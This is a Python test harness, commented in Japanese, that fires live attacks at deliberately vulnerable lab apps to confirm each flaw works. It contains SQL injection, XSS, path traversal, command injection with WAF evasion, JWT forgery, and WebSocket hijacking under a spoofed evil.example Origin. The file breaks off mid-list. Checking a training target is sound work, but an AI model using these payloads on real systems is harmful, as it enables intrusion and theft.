"""
ライブ・スモークテスト（システムテスト）。

test_vulns.py がコード（in-process）の正しさを見るのに対し、これは
**稼働中の実体を HTTP で外から叩いて**、いまその設定のターゲットが本当に
脆弱に動いているかを確認する。Docker/EC2 等にデプロイしたターゲットの
ワンクリック健全性チェック向け。

有効なバリアに適応する:
- WAF: 素朴ペイロードではなく回避ペイロードを常用（有効/無効どちらでも成立）。
- CSRF: フォームから csrf_token を取得して付与。
- honeypot: 隠しフィールドは送らない（誤検知を踏まない）。
- 2FA(totp): パスワード後の確認コードを /dev/inbox から取得（dev_inbox 時のみ）。
- otp: 送金確認コードを /dev/inbox から取得。

各チェックの結果: exploited(成立) / blocked(バリアで阻止) / skipped(前提不足) / fail(到達したが不発).

注意: これは攻撃を自動送信する。隔離環境・自分のターゲットにのみ使うこと。
"""

import http.cookiejar
import json
import re
import secrets
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

from core import jwtutil
from core.vulndata import VULN_MAP, vuln_sites

try:
    import simple_websocket   # flask-sock と同梱。WS 系チェックで使用。
except ImportError:           # 未インストールなら WS チェックは skipped にする。
    simple_websocket = None

_TYPE = {v["id"]: v["type"] for v in VULN_MAP}
_SITE = {v["id"]: vuln_sites(v) for v in VULN_MAP}   # id -> 所属サイト集合

EXPLOITED, BLOCKED, SKIPPED, FAIL = "exploited", "blocked", "skipped", "fail"


class _RecordingRedirect(urllib.request.HTTPRedirectHandler):
    """リダイレクト(302等)応答の Set-Cookie も拾うためのハンドラ。

    ログインは 302 で session Cookie を設定するが、urllib は内部で追従し最終応答しか
    返さないため、属性検査用に途中応答の Set-Cookie をここで記録する。
    """
    def __init__(self, sink):
        super().__init__()
        self._sink = sink

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        self._sink.extend(headers.get_all("Set-Cookie") or [])
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class Session:
    def __init__(self, base_url):
        self.base = base_url.rstrip("/")
        self.setcookies = []   # 観測した Set-Cookie ヘッダ（生文字列。属性検査に使う）
        jar = http.cookiejar.CookieJar()
        handlers = [urllib.request.HTTPCookieProcessor(jar),
                    _RecordingRedirect(self.setcookies)]
        # 自己署名の HTTPS ターゲット（評価用）は証明書検証をスキップして叩く。
        if self.base.lower().startswith("https"):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            handlers.append(urllib.request.HTTPSHandler(context=ctx))
        self.opener = urllib.request.build_opener(*handlers)

    def request(self, method, path, data=None, headers=None, json_body=None):
        url = self.base + path
        if json_body is not None:
            body = json.dumps(json_body).encode()
        elif data is not None:
            body = urllib.parse.urlencode(data).encode()
        else:
            body = None
        req = urllib.request.Request(url, data=body, method=method)
        if json_body is not None:
            req.add_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        try:
            with self.opener.open(req, timeout=20) as resp:
                self.setcookies.extend(resp.headers.get_all("Set-Cookie") or [])
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            self.setcookies.extend(e.headers.get_all("Set-Cookie") or [])
            return e.code, e.read().decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return 0, "request error: %r" % e

    def session_setcookie(self):
        """観測した Set-Cookie のうち Flask セッション Cookie の生ヘッダ（最後の1件）。"""
        for raw in reversed(self.setcookies):
            if raw.lower().startswith("session="):
                return raw
        return None

    def get(self, path, headers=None):
        return self.request("GET", path, headers=headers)

    def get_q(self, path, params):
        return self.get(path + "?" + urllib.parse.urlencode(params))

    def post(self, path, data):
        return self.request("POST", path, data)

    def post_json(self, path, obj):
        return self.request("POST", path, json_body=obj)

    def bearer(self, path, token):
        return self.get(path, headers={"Authorization": "Bearer " + token})

    def csrf(self, path):
        _, body = self.get(path)
        return _find_csrf(body)


def _find_csrf(body):
    m = re.search(r'name="csrf_token" value="([^"]+)"', body)
    return m.group(1) if m else None


def _inbox_code(s):
    """/dev/inbox から最新の6桁コードを取り出す（dev_inbox 配送時のみ機能）。"""
    st, body = s.get("/dev/inbox")
    if st != 200:
        return None
    m = re.search(r"<code>(\d{6})</code>", body)
    return m.group(1) if m else None


def _form(features, base):
    """csrf 有効時に csrf_token を載せたフォーム dict を作る（honeypot は送らない）。"""
    return dict(base)


def _login(s, username, password, features, delivery):
    """HTTP でログイン。csrf/2FA に適応。戻り値 (ok, reason)。"""
    data = {"username": username, "password": password}
    if "csrf" in features:
        tok = s.csrf("/login")
        if tok:
            data["csrf_token"] = tok
    st, body = s.post("/login", data)
    if "2段階" in body or "/login/2fa" in body:
        if delivery != "dev_inbox":
            return False, "2FA: 配送=%s ではコード取得不可" % delivery
        code = _inbox_code(s)
        if not code:
            return False, "2FA: inbox にコードが無い"
        d2 = {"otp": code}
        if "csrf" in features:
            tok2 = _find_csrf(body)
            if tok2:
                d2["csrf_token"] = tok2
        s.post("/login/2fa", d2)
    _, home = s.get("/")
    return (username in home), ("ログイン成功" if username in home else "ログイン未完了")


# ---------------------------------------------------------------------------
# 各脆弱性チェック（base_url ごとに新しい Session を使う）
# 戻り値: (status, detail)
# ---------------------------------------------------------------------------

def _c_sqli1(make, features, delivery):
    s = make()
    data = {"username": "admin' OR '1'='1", "password": "x"}
    if "csrf" in features:
        tok = s.csrf("/login")
        if tok:
            data["csrf_token"] = tok
    st, body = s.post("/login", data)
    if st == 403:
        return BLOCKED, "403（バリアで阻止）"
    if "Invalid credentials" in body:
        return FAIL, "認証回避できていない"
    # ログイン成功(ログアウト導線) or 2FA要求 = 誤パスワードでも認証を突破できた
    if "ログアウト" in body or "2段階" in body or "/login/2fa" in body:
        return EXPLOITED, "SQLi で admin の認証を回避"
    _, home = s.get("/")
    return (EXPLOITED, "SQLi で admin ログイン") if "ログアウト" in home else (FAIL, "回避不成立")


def _c_sqli2(make, features, delivery):
    s = make()
    st, body = s.get_q("/blog/search", {"q": "' UNION/**/SELECT id,username,password FROM bank_users-- -"})
    if st == 403:
        return BLOCKED, "403"
    return (EXPLOITED, "UNION で平文PW露出") if "admin123" in body else (FAIL, "admin123 が出ない")


def _c_xss_r(make, features, delivery):
    s = make()
    p = "<svg onload=alert(1)>"
    st, body = s.get_q("/blog/search", {"q": p})
    if st == 403:
        return BLOCKED, "403"
    return (EXPLOITED, "未エスケープで反射") if p in body else (FAIL, "未反射")


def _c_xss_s(make, features, delivery):
    s = make()
    p = "<svg onload=alert('s')>"
    data = {"author": "x", "body": p}
    if "csrf" in features:
        tok = s.csrf("/blog/1")
        if tok:
            data["csrf_token"] = tok
    st, _ = s.post("/blog/1/comment", data)
    if st == 403:
        return BLOCKED, "403"
    _, body = s.get("/blog/1")
    return (EXPLOITED, "格納コメントが未エスケープ描画") if p in body else (FAIL, "未描画")


def _c_xss_s2(make, features, delivery):
    s = make()
    # 記事投稿は店舗担当者(staff)・管理者(admin)のみ。staff で投稿する。
    ok, reason = _login(s, "staff", "staff123", features, delivery)
    if not ok:
        return SKIPPED, reason
    p = "<svg onload=alert('p')>"
    data = {"title": "t", "body": p}
    if "csrf" in features:
        tok = s.csrf("/blog/new")
        if tok:
            data["csrf_token"] = tok
    st, _ = s.post("/blog/new", data)
    if st == 403:
        return BLOCKED, "403"
    # 一覧はエスケープ描画。生ペイロードは個別記事ページ(|safe)に出るので最新記事を辿る
    _, blog = s.get("/blog")
    ids = [int(n) for n in re.findall(r"/blog/(\d+)", blog)]
    if not ids:
        return FAIL, "記事リンクが見つからない"
    _, post = s.get("/blog/%d" % max(ids))
    return (EXPLOITED, "格納記事が未エスケープ描画") if p in post else (FAIL, "未描画")


def _c_xss_s3(make, features, delivery):
    """XSS-S3: 購入 → 購入履歴からレビュー投稿 → 商品詳細で未エスケープ描画。"""
    s = make()
    ok, reason = _login(s, "alice", "password123", features, delivery)
    if not ok:
        return SKIPPED, reason
    buy = {"product_id": "1", "price": "2000", "quantity": "1"}
    if "csrf" in features:
        tok = s.csrf("/shop/product/1/checkout")
        if tok:
            buy["csrf_token"] = tok
    s.post("/shop/buy", buy)
    # 購入履歴のレビューフォームから注文 ID を取得
    _, hist = s.get("/orders")
    oids = [int(n) for n in re.findall(r"/orders/(\d+)/review", hist)]
    if not oids:
        return FAIL, "購入履歴にレビューフォームが無い"
    p = "<svg onload=alert('review')>"
    data = {"rating": "5", "body": p}
    if "csrf" in features:
        tok = s.csrf("/orders")
        if tok:
            data["csrf_token"] = tok
    st, _ = s.post("/orders/%d/review" % max(oids), data)
    if st == 403:
        return BLOCKED, "403"
    _, page = s.get("/shop/product/1")
    return (EXPLOITED, "購入者レビューが未エスケープ描画") if p in page else (FAIL, "未描画")


def _c_idor1(make, features, delivery):
    s = make()
    ok, reason = _login(s, "testuser", "test", features, delivery)
    if not ok:
        return SKIPPED, reason
    st, body = s.get("/profile/1")
    if st == 403:
        return BLOCKED, "403"
    return (EXPLOITED, "他人(admin)の機密ノート露出") if "RBK-9C21-4E08-7F3A" in body else (FAIL, "機密ノートのカナリアが出ない")


def _c_idor2(make, features, delivery):
    s = make()
    ok, reason = _login(s, "alice", "password123", features, delivery)
    if not ok:
        return SKIPPED, reason
    data = {"product_id": "1", "price": "2000", "quantity": "1"}
    if "csrf" in features:
        tok = s.csrf("/shop/product/1/checkout")
        if tok:
            data["csrf_token"] = tok
    s.post("/shop/buy", data)
    # 別ユーザーで alice の注文を閲覧
    s2 = make()
    ok2, reason2 = _login(s2, "bob", "qwerty", features, delivery)
    if not ok2:
        return SKIPPED, reason2
    st, body = s2.get("/orders/1")
    if st == 403:
        return BLOCKED, "403"
    return (EXPLOITED, "他人(alice)の注文を閲覧") if "Basic Account Upgrade" in body else (FAIL, "注文が見えない")


def _c_path1(make, features, delivery):
    s = make()
    st, body = s.get_q("/shop/manual", {"file": "/etc/passwd"})
    if st == 403:
        return BLOCKED, "403"
    return (EXPLOITED, "絶対パスで /etc/passwd 読取") if "root:" in body else (FAIL, "root: が出ない")


def _c_cmd1(make, features, delivery):
    s = make()
    ok, reason = _login(s, "testuser", "test", features, delivery)
    if not ok:
        return SKIPPED, reason
    # 取得コマンドは `curl … {image_url} | convert …`。末尾の `| convert` を `#` で
    # コメントアウトして id の出力を捕捉する。`;` を使わないので WAF も回避できる。
    data = {"image_url": "http://127.0.0.1:9/x.jpg | id #"}
    if "csrf" in features:
        tok = s.csrf("/admin/image-import")
        if tok:
            data["csrf_token"] = tok
    st, body = s.post("/admin/image-import", data)
    if st == 403:
        return BLOCKED, "403"
    return (EXPLOITED, "画像URL取り込みでコマンド実行") if "uid=" in body else (FAIL, "uid= が出ない")


def _c_authz1(make, features, delivery):
    s = make()
    st, body = s.get_q("/admin", {"admin": "1"})
    if st == 403:
        return BLOCKED, "403"
    return (EXPLOITED, "?admin=1 で管理画面・平文PW露出") if "admin123" in body else (FAIL, "入れない")


def _c_biz1(make, features, delivery):
    s = make()
    ok, reason = _login(s, "alice", "password123", features, delivery)
    if not ok:
        return SKIPPED, reason
    data = {"to_user_id": "1", "amount": "-5000"}
    if "csrf" in features:
        tok = s.csrf("/transfer")
        if tok:
            data["csrf_token"] = tok
    st, body = s.post("/transfer", data)
    if st == 403:
        return BLOCKED, "403"
    if "otp" in features and ("OTP" in body or "/transfer/confirm" in body):
        if delivery != "dev_inbox":
            return SKIPPED, "OTP: 配送=%s ではコード取得不可" % delivery
        code = _inbox_code(s)
        if not code:
            return SKIPPED, "OTP: inbox にコードが無い"
        d2 = {"otp": code}
        if "csrf" in features:
            tok2 = _find_csrf(body)
            if tok2:
                d2["csrf_token"] = tok2
        st, body = s.post("/transfer/confirm", d2)
    return (EXPLOITED, "負数送金が成立") if "送金しました" in body else (FAIL, "送金不成立")


def _c_biz2(make, features, delivery):
    s = make()
    ok, reason = _login(s, "alice", "password123", features, delivery)
    if not ok:
        return SKIPPED, reason
    data = {"product_id": "3", "price": "0", "quantity": "1"}
    if "csrf" in features:
        tok = s.csrf("/shop/product/3/checkout")
        if tok:
            data["csrf_token"] = tok
    st, body = s.post("/shop/buy", data)
    if st == 403:
        return BLOCKED, "403"
    return (EXPLOITED, "価格改ざんで無料購入(0 pt)") if ("購入しました" in body and "0 pt" in body) else (FAIL, "無料購入できない")


def _c_authz2(make, features, delivery):
    """AUTHZ-2: 利用者が店舗担当者向けの商品管理で商品を追加できる（BFLA）。"""
    s = make()
    ok, reason = _login(s, "testuser", "test", features, delivery)
    if not ok:
        return SKIPPED, reason
    marker = "PWNED_PRODUCT"
    data = {"name": marker, "price": "1"}
    if "csrf" in features:
        tok = s.csrf("/admin/products/new")
        if tok:
            data["csrf_token"] = tok
    st, _ = s.post("/admin/products/new", data)
    if st == 403:
        return BLOCKED, "403"
    _, page = s.get("/admin/products")
    return (EXPLOITED, "利用者が商品を追加(BFLA)") if marker in page else (FAIL, "商品追加が反映されない")


def _c_authz4(make, features, delivery):
    """AUTHZ-4: 利用者が他人(店舗)のブログ記事を改ざんできる（BFLA）。"""
    s = make()
    ok, reason = _login(s, "testuser", "test", features, delivery)
    if not ok:
        return SKIPPED, reason
    marker = "PWNED_ARTICLE"
    data = {"title": marker, "body": "tampered"}
    if "csrf" in features:
        tok = s.csrf("/blog/1/edit")
        if tok:
            data["csrf_token"] = tok
    st, _ = s.post("/blog/1/edit", data)
    if st == 403:
        return BLOCKED, "403"
    _, page = s.get("/blog/1")
    return (EXPLOITED, "利用者が他人の記事を改ざん(BFLA)") if marker in page else (FAIL, "改ざんが反映されない")


def _c_authz3(make, features, delivery):
    """AUTHZ-3: 利用者が role 変更APIで自分(testuser=6)を admin へ昇格（垂直権限昇格）。"""
    s = make()
    ok, reason = _login(s, "testuser", "test", features, delivery)
    if not ok:
        return SKIPPED, reason
    data = {"role": "admin"}
    if "csrf" in features:
        tok = s.csrf("/admin/users")
        if tok:
            data["csrf_token"] = tok
    st, _ = s.post("/admin/users/6/role", data)
    if st == 403:
        return BLOCKED, "403"
    # 反映確認: ユーザー一覧で testuser の現在ロール欄が admin になっている
    _, page = s.get("/admin/users")
    return (EXPLOITED, "利用者が自分を admin へ昇格") if re.search(r"testuser.*?>admin<", page, re.S) else (FAIL, "昇格が反映されない")


def _session_setcookie(make, features, delivery):
    """正規ログインでセッション Cookie を発行させ、その Set-Cookie 生ヘッダを返す。"""
    s = make()
    _login(s, "alice", "password123", features, delivery)
    return s.session_setcookie()


def _c_cookie_httponly(make, features, delivery):
    """COOKIE-1: セッション Cookie に HttpOnly 属性が付かない。"""
    raw = _session_setcookie(make, features, delivery)
    if not raw:
        return SKIPPED, "セッション Cookie を観測できない（ログイン未完了）"
    if "httponly" in raw.lower():
        return FAIL, "HttpOnly が付与されている"
    return EXPLOITED, "セッション Cookie に HttpOnly 無し（XSSで document.cookie 窃取可）"


def _c_cookie_secure(make, features, delivery):
    """COOKIE-2: セッション Cookie に Secure 属性が付かない。"""
    raw = _session_setcookie(make, features, delivery)
    if not raw:
        return SKIPPED, "セッション Cookie を観測できない（ログイン未完了）"
    if "secure" in raw.lower():
        return FAIL, "Secure が付与されている"
    return EXPLOITED, "セッション Cookie に Secure 無し（平文HTTPで送出されうる）"


# ---------------------------------------------------------------------------
# VulnBoard（JWT）チェック — Bearer トークンを偽造して送る
# ---------------------------------------------------------------------------

def _api_token(s, username="alice", password="password123"):
    st, body = s.post_json("/api/login", {"username": username, "password": password})
    if st != 200:
        return None
    try:
        return json.loads(body)["token"]
    except Exception:
        return None


def _c_jwt1(make, features, delivery):
    """JWT-1: alg=none の無署名トークンで admin に昇格。"""
    s = make()
    forged = jwtutil.encode({"sub": "attacker", "role": "admin", "uid": 1}, alg="none")
    st, body = s.bearer("/api/admin", forged)
    if st == 403:
        return FAIL, "alg=none が拒否された（403）"
    return (EXPLOITED, "alg=none で admin 昇格") if "intapi_live_" in body else (FAIL, "昇格できない (%d)" % st)


def _c_jwt2(make, features, delivery):
    """JWT-2: 署名を検証しない /api/tasks を、壊れた署名のトークンで悪用。"""
    s = make()
    bad = jwtutil.encode({"uid": 1}, alg="HS256", secret="totally-wrong-key")
    st, body = s.bearer("/api/tasks", bad)
    try:
        echoed = json.loads(body).get("uid")
    except Exception:
        echoed = None
    return (EXPLOITED, "署名不正でも uid=1（管理者）のタスクを取得") if (st == 200 and echoed == 1) \
        else (FAIL, "署名未検証を確認できない (%d)" % st)


def _c_jwt3(make, features, delivery):
    """JWT-3: 弱い HMAC 秘密鍵 secret123 で署名し admin に昇格。"""
    s = make()
    forged = jwtutil.encode({"sub": "attacker", "role": "admin", "uid": 1}, alg="HS256", secret="secret123")
    st, body = s.bearer("/api/admin", forged)
    return (EXPLOITED, "弱い鍵 secret123 で admin 昇格") if "intapi_live_" in body else (FAIL, "昇格できない (%d)" % st)


def _c_jwt4(make, features, delivery):
    """JWT-4: 発行トークンの payload に平文の機微情報が含まれる。"""
    s = make()
    token = _api_token(s)
    if not token:
        return SKIPPED, "ログイン不可（トークン取得失敗）"
    claims = jwtutil.decode_unverified(token) or {}
    leaked = [k for k in ("password", "secret_note") if claims.get(k)]
    return (EXPLOITED, "payload に %s が平文露出" % "/".join(leaked)) if leaked else (FAIL, "機微情報なし")


def _c_jwt5(make, features, delivery):
    """JWT-5: 発行トークンに exp が無く、改ざんした過去 exp でも受理される。"""
    s = make()
    token = _api_token(s)
    if not token:
        return SKIPPED, "ログイン不可（トークン取得失敗）"
    claims = jwtutil.decode_unverified(token) or {}
    if "exp" in claims:
        return FAIL, "exp が付与されている"
    # exp を過去にしたトークンでも /api/me が通る（失効確認なし）
    expired = jwtutil.encode({"sub": "attacker", "uid": 1, "exp": 1}, alg="HS256", secret="secret123")
    st, _ = s.bearer("/api/me", expired)
    return (EXPLOITED, "exp 無し＆過去 exp でも受理") if st == 200 else (FAIL, "過去 exp が拒否された (%d)" % st)


def _c_jwt6(make, features, delivery):
    """JWT-6: /api/pubkey の公開鍵を HMAC 鍵に使い HS256 で署名（alg 混同）。"""
    s = make()
    st, body = s.get("/api/pubkey")
    try:
        pem = json.loads(body)["public_key"]
    except Exception:
        return SKIPPED, "公開鍵を取得できない (%d)" % st
    forged = jwtutil.encode({"sub": "attacker", "role": "admin", "uid": 1}, alg="HS256", secret=pem)
    st2, body2 = s.bearer("/api/admin", forged)
    return (EXPLOITED, "公開鍵 HMAC で admin 昇格") if "intapi_live_" in body2 else (FAIL, "昇格できない (%d)" % st2)


def _c_jwt7(make, features, delivery):
    """JWT-7: SPA シェルの反射型XSS（msg）。localStorage 保持の JWT を窃取できる文脈。"""
    s = make()
    p = "<svg onload=alert(document.cookie)>"
    st, body = s.get_q("/", {"msg": p})
    if st == 403:
        return BLOCKED, "403（バリアで阻止）"
    if p not in body:
        return FAIL, "msg が未反射（XSSシンクなし）"
    has_ls = "localStorage" in body and "jwt" in body
    return (EXPLOITED, "反射XSS×localStorage(JWT)でトークン窃取可能") if has_ls \
        else (EXPLOITED, "反射XSS成立")


def _rand_user():
    return "smoke_" + secrets.token_hex(4)


def _c_mass1(make, features, delivery):
    """MASS-1: 登録時に role=admin を渡して管理者に昇格。"""
    s = make()
    st, body = s.post_json("/api/register", {"username": _rand_user(), "password": "pw", "role": "admin"})
    if st not in (200, 201):
        return FAIL, "登録できない (%d)" % st
    try:
        tok = json.loads(body)["token"]
    except Exception:
        return FAIL, "トークンが返らない"
    st2, body2 = s.bearer("/api/admin", tok)
    return (EXPLOITED, "登録時 role=admin で管理者に昇格") if "intapi_live_" in body2 else (FAIL, "昇格できない (%d)" % st2)


def _c_enum1(make, features, delivery):
    """ENUM-1: 既存ユーザー名と未存在で応答が異なる（アカウント列挙）。"""
    s = make()
    st_exist, body_exist = s.post_json("/api/register", {"username": "alice", "password": "x"})
    st_new, _ = s.post_json("/api/register", {"username": _rand_user(), "password": "x"})
    if st_exist == 409 and st_new in (200, 201) and "taken" in body_exist:
        return EXPLOITED, "既存ユーザー名で 409『taken』→ アカウント列挙可能"
    return FAIL, "応答差分が無い (exist=%d new=%d)" % (st_exist, st_new)


def _c_pwpolicy1(make, features, delivery):
    """PWPOLICY-1: 短く単純なパスワードでも登録できる。"""
    s = make()
    st, _ = s.post_json("/api/register", {"username": _rand_user(), "password": "1"})
    return (EXPLOITED, "PW『1』でも登録できる（ポリシー不在）") if st in (200, 201) \
        else (FAIL, "弱いパスワードが拒否された (%d)" % st)


def _c_enum2(make, features, delivery):
    """ENUM-2: 未認証で GET /transfer/lookup?account=3 から alice の username を列挙できる。"""
    s = make()
    st, body = s.get_q("/transfer/lookup", {"account": "3"})
    if st == 403:
        return BLOCKED, "403（バリアで阻止）"
    if st != 200:
        return FAIL, "200 が返らない (%d)" % st
    try:
        data = json.loads(body)
    except Exception:
        return FAIL, "JSON でない応答: %r" % body[:100]
    username = data.get("username", "")
    if username == "alice":
        return EXPLOITED, "未認証で口座番号→名義人(alice)を列挙（ENUM-2）"
    return FAIL, "username が alice でない: %r" % username


# ---------------------------------------------------------------------------
# VulnGraph（GraphQL）チェック — /graphql にクエリ/ミューテーションを投げる
# ---------------------------------------------------------------------------

def _gql(s, query, variables=None):
    body = {"query": query}
    if variables:
        body["variables"] = variables
    st, text = s.post_json("/graphql", body)
    try:
        return st, json.loads(text)
    except Exception:
        return st, {}


def _c_gql1(make, features, delivery):
    """GQL-1: イントロスペクションが有効でスキーマを全開示できる。"""
    s = make()
    st, data = _gql(s, "{ __schema { types { name } } }")
    types = ((data.get("data") or {}).get("__schema") or {}).get("types")
    return (EXPLOITED, "イントロスペクションでスキーマ開示") if types else (FAIL, "introspection 無効 (%d)" % st)


def _c_gql2(make, features, delivery):
    """GQL-2: GET /graphql で GraphiQL エクスプローラが公開されている。"""
    s = make()
    st, body = s.get("/graphql")
    ok = st == 200 and "graphiql" in body.lower()
    return (EXPLOITED, "GraphiQL エクスプローラが公開") if ok else (FAIL, "エクスプローラ非公開 (%d)" % st)


def _c_gql3(make, features, delivery):
    """GQL-3: BOLA。user(id) で他人(admin)の機微フィールドを取得できる。"""
    s = make()
    st, data = _gql(s, "{ user(id:1){ secretNote password } }")
    u = (data.get("data") or {}).get("user") or {}
    return (EXPLOITED, "BOLA で admin の secretNote/password 取得") if "RBK-9C21-4E08-7F3A" in (u.get("secretNote") or "") \
        else (FAIL, "BOLA 不成立 (%d)" % st)


def _c_gql4(make, features, delivery):
    """GQL-4: BFLA。updateUser で任意ユーザーを admin に昇格できる。"""
    s = make()
    st, data = _gql(s, 'mutation { updateUser(id:5, role:"admin"){ role } }')
    role = ((data.get("data") or {}).get("updateUser") or {}).get("role")
    return (EXPLOITED, "BFLA で任意ユーザーを admin 昇格") if role == "admin" else (FAIL, "BFLA 不成立 (%d)" % st)


def _c_gql5(make, features, delivery):
    """GQL-5: 引数 SQLi。posts(search) の UNION で平文パスワードを漏らす。"""
    s = make()
    q = "{ posts(search:\"' UNION SELECT 1,2,password,username,5 FROM bank_users-- -\"){ title } }"
    st, data = _gql(s, q)
    titles = [p.get("title") for p in ((data.get("data") or {}).get("posts") or [])]
    return (EXPLOITED, "引数SQLiで平文PW(admin123)露出") if "admin123" in titles else (FAIL, "SQLi 不成立 (%d)" % st)


def _c_gql6(make, features, delivery):
    """GQL-6: クエリ深さ/バッチ制限なし（DoS・総当りの増幅面）。"""
    s = make()
    st, text = s.post_json("/graphql", [{"query": "{ __typename }"}, {"query": "{ __typename }"}])
    try:
        arr = json.loads(text)
    except Exception:
        arr = None
    batch_ok = isinstance(arr, list) and len(arr) == 2
    _, deep = _gql(s, "{ user(id:1){ posts{ author{ posts{ author{ name }}}}} }")
    deep_ok = "data" in deep
    return (EXPLOITED, "バッチ配列・深い循環ネストを無制限受理") if (batch_ok and deep_ok) \
        else (FAIL, "制限あり? batch=%s deep=%s" % (batch_ok, deep_ok))


def _c_gql7(make, features, delivery):
    """GQL-7: GET でミューテーションを受理（CSRF）。"""
    s = make()
    mutation = 'mutation { updateUser(id:5, role:"user"){ role } }'
    st, body = s.get("/graphql?query=" + urllib.parse.quote(mutation))
    try:
        data = json.loads(body)
    except Exception:
        data = {}
    ok = ((data.get("data") or {}).get("updateUser")) is not None
    return (EXPLOITED, "GET でミューテーション実行（CSRF）") if ok else (FAIL, "GET でミューテーション不可 (%d)" % st)


# ---------------------------------------------------------------------------
# VulnBank サポートチャット（WebSocket）チェック — WS-1..4
# ---------------------------------------------------------------------------

def _ws_base(http_base):
    """http(s):// の base_url を ws(s):// に変換する。"""
    if http_base.lower().startswith("https"):
        return "wss" + http_base[5:]
    if http_base.lower().startswith("http"):
        return "ws" + http_base[4:]
    return http_base


def _ws_open(ws_url, cookie=None, origin=None):
    """simple_websocket で WS 接続を開く（自己署名 TLS は検証スキップ）。"""
    headers = {}
    if cookie:
        headers["Cookie"] = cookie
    if origin:
        headers["Origin"] = origin
    kwargs = {"headers": headers or None}
    if ws_url.lower().startswith("wss"):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kwargs["ssl_context"] = ctx
    return simple_websocket.Client.connect(ws_url, **kwargs)


def _ws_drain(ws, n=6, timeout=1.5):
    out = []
    for _ in range(n):
        try:
            msg = ws.receive(timeout=timeout)
        except Exception:
            break
        if msg is None:
            break
        out.append(msg)
    return out


def _ws_session_cookie(s, features, delivery):
    """alice でログインして session Cookie（'session=...'）を取り出す。"""
    ok, _ = _login(s, "alice", "password123", features, delivery)
    raw = s.session_setcookie()
    if not raw:
        return None
    return raw.split(";", 1)[0]   # 'session=<value>' 部分のみ


def _c_ws1(make, features, delivery):
    """WS-1: ハンドシェイクで Origin を検証しない（CSWSH）。"""
    if simple_websocket is None:
        return SKIPPED, "simple_websocket 未インストール（pip install flask-sock）"
    s = make()
    cookie = _ws_session_cookie(s, features, delivery)
    ws_url = _ws_base(s.base) + "/support/ws?room=R-1003"
    try:
        # 別オリジンを名乗り、被害者の Cookie を添えて接続（罠サイトからの CSWSH を再現）。
        ws = _ws_open(ws_url, cookie=cookie, origin="http://evil.example")
    except Exception as e:  # noqa: BLE001
        return FAIL, "ハンドシェイクが拒否された: %r" % e
    msgs = _ws_drain(ws, n=4)
    ws.close()
    if msgs:
        return EXPLOITED, "偽 Origin でも接続が成立し会話履歴を受信（Origin 未検証）"
    return FAIL, "接続したが履歴を受信できない"


def _c_ws2(make, features, delivery):
    """WS-2: 送信メッセージが無加工で配信される（格納XSS）。"""
    if simple_websocket is None:
        return SKIPPED, "simple_websocket 未インストール（pip install flask-sock）"
    s = make()
    cookie = _ws_session_cookie(s, features, delivery)
    ws_url = _ws_base(s.base) + "/support/ws?room=R-1003"
    # サーバは受信を毎回 DB に永続し接続時に全件再生するため、ルーム履歴は実行ごとに
    # 増え続ける。「直後の1フレーム」だけをエコー視すると履歴の取り違えで不発になるので、
    # 既存履歴を出し切ってから一意ノンス付きで送り、後続フレーム群から自分の配信を照合する。
    nonce = secrets.token_hex(4)
    payload = '<img src=x onerror=alert("%s")>' % nonce
    try:
        ws = _ws_open(ws_url, cookie=cookie)
        _ws_drain(ws, n=100, timeout=0.5)            # 接続時に再生される既存履歴を出し切る
        ws.send(json.dumps({"body": payload}))
        echoes = _ws_drain(ws, n=20, timeout=1.5)    # 自分の配信を含む後続フレームを集める
        ws.close()
    except Exception as e:  # noqa: BLE001
        return FAIL, "WS 通信に失敗: %r" % e
    for m in echoes:
        try:
            body = json.loads(m).get("body", "")
        except Exception:  # noqa: BLE001
            body = m or ""
        if body == payload:
            return EXPLOITED, "送信ペイロードが無加工で配信される（受信側 innerHTML で発火）"
    return FAIL, "配信されたが無加工でない: %r" % (echoes[:1] or echoes,)


def _c_ws3(make, features, delivery):
    """WS-3: 他人のルームに接続して会話（カナリア）を窃取（Room IDOR）。"""
    if simple_websocket is None:
        return SKIPPED, "simple_websocket 未インストール（pip install flask-sock）"
    s = make()
    cookie = _ws_session_cookie(s, features, delivery)   # alice として（R-1004 は bob のルーム）
    ws_url = _ws_base(s.base) + "/support/ws?room=R-1004"
    try:
        ws = _ws_open(ws_url, cookie=cookie)
        msgs = _ws_drain(ws, n=6)
        ws.close()
    except Exception as e:  # noqa: BLE001
        return FAIL, "WS 通信に失敗: %r" % e
    if any("BKSUP-7F3A-9C21" in m for m in msgs):
        return EXPLOITED, "非所有ルーム R-1004 のカナリアを取得（所有者未検証）"
    return FAIL, "接続したがカナリアを取得できない"


def _c_ws4(make, features, delivery):
    """WS-4: WS メッセージの sender をサーバが検証せず信用する（送信者なりすまし）。"""
    if simple_websocket is None:
        return SKIPPED, "simple_websocket 未インストール（pip install flask-sock）"
    s = make()
    cookie = _ws_session_cookie(s, features, delivery)
    ws_url = _ws_base(s.base) + "/support/ws?room=R-1003"
    spoof = "サポート窓口"
    # WS-2 同様、蓄積した履歴の取り違えを避けるため一意ノンス付き本文で送り、
    # 既存履歴を出し切ってから後続フレーム群の中で「自分が送った本文」の配信を特定する。
    nonce = secrets.token_hex(4)
    body = "本人確認のため暗証番号を入力ください %s" % nonce
    try:
        ws = _ws_open(ws_url, cookie=cookie)
        _ws_drain(ws, n=100, timeout=0.5)
        ws.send(json.dumps({"sender": spoof, "body": body}))
        echoes = _ws_drain(ws, n=20, timeout=1.5)
        ws.close()
    except Exception as e:  # noqa: BLE001
        return FAIL, "WS 通信に失敗: %r" % e
    sender = ""
    for m in echoes:
        try:
            obj = json.loads(m)
        except Exception:  # noqa: BLE001
            continue
        if obj.get("body", "") == body:   # 自分が送ったメッセージの配信を特定して sender を見る
            sender = obj.get("sender", "")
            break
    if sender == spoof:
        return EXPLOITED, "クライアント指定の sender がそのまま配信される（送信者なりすまし）"
    return FAIL, "sender が認証ユーザに固定されている: %r" % sender


CHECKS = [
    ("SQLi-1", _c_sqli1), ("SQLi-2", _c_sqli2),
